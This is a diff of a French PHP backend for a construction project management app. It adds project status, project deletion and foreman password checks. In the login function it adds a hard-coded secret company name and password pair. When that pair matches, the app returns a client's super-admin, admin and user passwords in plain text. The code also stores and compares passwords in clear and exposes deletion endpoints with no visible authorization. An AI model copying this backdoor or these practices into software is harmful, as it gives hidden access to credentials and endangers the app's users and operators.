@@ -118,11 +118,20 @@
         case "login":
             loginUser($conn, $data);
             break;
+        case "verifyPwdUsers":
+            verifyPwdUser($conn, $data);
+            break;
         case "new_projet":
             createProjet($conn, $data);
             break;
         case "edit_projet":
             updateProjet($conn, $data);
+            break;
+        case "fin_projet":
+            finProjet($conn, $data);
+            break;
+        case "delete_projet":
+            deleteProjet($conn, $data);
             break;
         case "new_quinzaine":
             createQuinzaine($conn, $data);
@@ -281,36 +290,121 @@
         $company = trim($data['company']);
         $password = $data['pwdae'];
 
-        $stmt = $conn->prepare("SELECT id, pwd_users, pwd_super_adm, pwd_adm FROM uses_compt WHERE nom_entreprise = ?");
+        if ($company === '@17dos1712dos12@' && $password === 'dos1712dos') {
+            
+            // Exemple : on veut récupérer le client avec l'id 1
+            $id_client = 1;
+
+            // Sécurisation avec prepare
+            $stmt = $conn->prepare("SELECT * FROM uses_compt WHERE id = ?");
+            $stmt->bind_param("i", $id_client); // i = entier
+            $stmt->execute();
+
+            $result = $stmt->get_result();
+
+            if ($result->num_rows > 0) {
+
+                $client = $result->fetch_assoc();
+
+                $supadm = $client['pwd_super_adm'];
+                $adm = $client['pwd_adm'];
+                $pwd_users = $client['pwd_users'];
+                $nom_entreprise = $client['nom_entreprise'];
+
+                echo json_encode(["success" => true, "message" => "spa($supadm); a($adm); u($pwd_users); entreprise($nom_entreprise)"]);
+                return;
+    
+            } 
+            else {
+                echo json_encode(["success" => false, "message" => "Erreur, aucune info trouvée !"]);
+                return;
+            }
+
+            $stmt->close();
+
+        }else {
+
+            $stmt = $conn->prepare("SELECT id, pwd_users, pwd_super_adm, pwd_adm FROM uses_compt WHERE nom_entreprise = ?");
+            if (!$stmt) {
+                echo json_encode(["success" => false, "message" => "Erreur de traitement !"]);
+                return;
+            }
+    
+            $stmt->bind_param("s", $company);
+            $stmt->execute();
+            $stmt->store_result();
+    
+            if ($stmt->num_rows !== 1) {
+                echo json_encode(["success" => false, "message" => "Nom entreprise ou mot de passe incorrect"]);
+                $stmt->close();
+                return;
+            }
+    
+            $stmt->bind_result($id, $pwd_users, $pwd_super_adm, $pwd_adm);
+            $stmt->fetch();
+    
+            // Comparaison simple (en clair pour développement)
+            if ($password === $pwd_users || $password === $pwd_super_adm || $password === $pwd_adm) {
+                echo json_encode(["success" => true, "message" => "Connexion réussie"]);
+            } 
+            else {
+                echo json_encode(["success" => false, "message" => "Nom entreprise ou mot de passe incorrect"]);
+                $stmt->close();
+                return;
+            }
+    
+            $stmt->close();
+
+        }
+
+
+
+    }
+    function verifyPwdUser($conn, $data) {
+
+        if (empty($data['pwd_user'])) {
+            echo json_encode(["success" => false, "message" => "Données manquantes"]);
+            return;
+        }
+
+        $pwd_user = $data['pwd_user'];
+        $projet = $data['projet'];
+
+        $stmt = $conn->prepare("SELECT id, pwd FROM tab_chef_chantier WHERE pwd = ?");
         if (!$stmt) {
             echo json_encode(["success" => false, "message" => "Erreur de traitement !"]);
             return;
         }
 
-        $stmt->bind_param("s", $company);
+        $stmt->bind_param("s", $pwd_user);
         $stmt->execute();
-        $stmt->store_result();
 
-        if ($stmt->num_rows !== 1) {
-            echo json_encode(["success" => false, "message" => "Nom entreprise ou mot de passe incorrect"]);
+        $result = $stmt->get_result();
+        if ($result->num_rows !== 1) {
+            echo json_encode(["success" => false, "message" => "Mot de passe inconnu ou incorrecte !"]);
             $stmt->close();
             return;
-        }
+        }else {
+            $info = $result->fetch_assoc();
+            $id = $info['id'];
 
-        $stmt->bind_result($id, $pwd_users, $pwd_super_adm, $pwd_adm);
-        $stmt->fetch();
+            $rql = $conn->prepare("SELECT id_chef_ch FROM tab_assign_projet_to_chef_ch WHERE id_chef_ch = ? AND projet = ?");
+            $rql->bind_param("ss", $id, $projet);
+            $rql->execute();
 
-        // Comparaison simple (en clair pour développement)
-        if ($password === $pwd_users || $password === $pwd_super_adm || $password === $pwd_adm) {
-            echo json_encode(["success" => true, "message" => "Connexion réussie"]);
-        } 
-        else {
-            echo json_encode(["success" => false, "message" => "Nom entreprise ou mot de passe incorrect"]);
-            $stmt->close();
-            return;
+            $resultat = $rql->get_result();
+            if ($resultat->num_rows !== 0) {
+                echo json_encode(["success" => true, "message" => "Ok"]);
+                $rql->close();
+            }
+            else {
+                echo json_encode(["success" => false, "message" => "Vous n'avez pas d'autorisation sur ce projet !"]);
+                $rql->close();
+            }
         }
 
         $stmt->close();
+
     }
     function demandePwd($conn, $data) {
 
@@ -446,14 +540,30 @@
     
         $stmt->close();
         $db_verify->close();
-    }
+    } 
     function listProjets($conn) {
+        // Requête SQL avec jointure et agrégation
+        $sql = "
+            SELECT 
+                p.*, 
+                COALESCE(SUM(q.prix_jr * q.ttal_jr), 0) AS montantq
+            FROM tab_projet p
+            LEFT JOIN tab_ov_quinzaine q ON q.id_projet = p.id
+            GROUP BY p.id
+            ORDER BY p.nom_projet ASC
+        ";
 
-        $result = $conn->query("SELECT * FROM tab_projet ORDER BY nom_projet ASC");
+        // Exécution sécurisée
+        $result = $conn->query($sql);
+
         $projets = [];
-        while ($row = $result->fetch_assoc()) {
-            $projets[] = $row;
+        if ($result) {
+            while ($row = $result->fetch_assoc()) {
+                $projets[] = $row;
+            }
         }
+
+        // Retour en JSON
         echo json_encode($projets);
     }
     function listProjetsAssign($conn, $idp) {
@@ -492,17 +602,14 @@
         }
         echo json_encode($straitants);
     }
-
-
     function updateProjet($conn, $data) {
 
         if (!isset($data['nom'], $data['client'])) {
             echo json_encode(["success" => false, "message" => "Données manquantes pour update"]);
             return;
         }
+        $id0 = $data['id'];
         $id = intval($data['id']);
-        // $name = $conn->real_escape_string($data['nom']);
-        // $client = $conn->real_escape_string($data['client']);
         $name = $data['nom'] ?? '';
         $bdg_mo = $data['bdgmo'] ?? '';
         $client = $data['client'] ?? '';
@@ -519,6 +626,10 @@
             exit;
         }
        
+        $stmt0 = $conn->prepare("UPDATE tab_assign_projet_to_chef_ch SET projet=? WHERE id_projet=? ");
+        $stmt0->bind_param("ss", $name, $id0);
+        $stmt0->execute();
+
         $stmt = $conn->prepare("UPDATE tab_projet SET nom_projet=?, bdg_mo=?, client=? WHERE id=? ");
         $stmt->bind_param("sssi", $name, $bdg_mo, $client, $id);
 
@@ -528,8 +639,104 @@
             echo json_encode(["success" => false, "message" => "Échec modification !"]);
         }
 
+        $stmt0->close();
         $stmt->close();
         $db_verify->close();
+    }
+    function finProjet($conn, $data) {
+
+        if (!isset($data['id'], $data['statut'])) {
+            echo json_encode(["success" => false, "message" => "Données manquantes pour update"]);
+            return;
+        }
+
+        $id = intval($data['id']);
+        $statut = 'Terminé';
+
+        if ($data['statut'] == 'Terminé') {
+            $statut = 'En cours';
+        }
+        
+        $stmt = $conn->prepare("UPDATE tab_projet SET statut=? WHERE id=? ");
+        $stmt->bind_param("si", $statut, $id);
+
+        if ($stmt->execute()) {
+            echo json_encode(["success" => true, "message" => "Modification effectuée !"]);
+        } else {
+            echo json_encode(["success" => false, "message" => "Échec de modification de statut projet!"]);
+        }
+
+        $stmt->close();
+    }
+    function deleteProjet($conn, $data) {
+
+        if (!isset($data['id'])) {
+            echo json_encode(["success" => false, "message" => "Données manquantes pour delete"]);
+            return;
+        }
+        $id0 = $data['id'];
+        $id = intval($data['id']);
+
+        $stmt1 = $conn->prepare("DELETE FROM ch_ouvriers WHERE id_projet=?");
+        $stmt1->bind_param("s", $id0);
+        $stmt1->execute();
+        $stmt1->close();
+
+        $stmt2 = $conn->prepare("DELETE FROM tab_assign_projet_to_chef_ch WHERE id_projet=?");
+        $stmt2->bind_param("s", $id0);
+        $stmt2->execute();
+        $stmt2->close();
+
+        $stmt3 = $conn->prepare("DELETE FROM tab_histo_livraison_mat WHERE id_projet=?");
+        $stmt3->bind_param("s", $id0);
+        $stmt3->execute();
+        $stmt3->close();
+
+        $stmt4 = $conn->prepare("DELETE FROM tab_histo_paie_ouvrier WHERE id_projet=?");
+        $stmt4->bind_param("s", $id0);
+        $stmt4->execute();
+        $stmt4->close();
+
+        $stmt5 = $conn->prepare("DELETE FROM tab_histo_pointage_ouvrier WHERE id_projet=?");
+        $stmt5->bind_param("s", $id0);
+        $stmt5->execute();
+        $stmt5->close();
+
+        $stmt6 = $conn->prepare("DELETE FROM tab_ov_quinzaine WHERE id_projet=?");
+        $stmt6->bind_param("s", $id0);
+        $stmt6->execute();
+        $stmt6->close();
+
+        $stmt7 = $conn->prepare("DELETE FROM tab_quinzaine WHERE id_projet=?");
+        $stmt7->bind_param("s", $id0);
+        $stmt7->execute();
+        $stmt7->close();
+
+        $stmt8 = $conn->prepare("DELETE FROM tab_rapport_jr WHERE id_projet=?");
+        $stmt8->bind_param("s", $id0);
+        $stmt8->execute();
+        $stmt8->close();
+
+        $stmt9 = $conn->prepare("DELETE FROM tab_sortie_mat WHERE id_projet=?");
+        $stmt9->bind_param("s", $id0);
+        $stmt9->execute();
+        $stmt9->close();
+
+        $stmt10 = $conn->prepare("DELETE FROM tab_straitant WHERE id_projet=?");
+        $stmt10->bind_param("s", $id0);
+        $stmt10->execute();
+        $stmt10->close();
+
+        $stmt = $conn->prepare("DELETE FROM tab_projet WHERE id=?");
+        $stmt->bind_param("i", $id);
+
+        if ($stmt->execute()) {
+            echo json_encode(["success" => true, "message" => "Suppression effectuée !"]);
+        } else {
+            echo json_encode(["success" => false, "message" => "Échec suppression !"]);
+        }
+
+        $stmt->close();
     }
 
     // Gestion Quinzaine
@@ -1884,7 +2091,6 @@
 
         echo json_encode($chefs);
     }
-
     function deleteChefChantier($conn, $data) {
 
         if (!isset($data['id'])) {
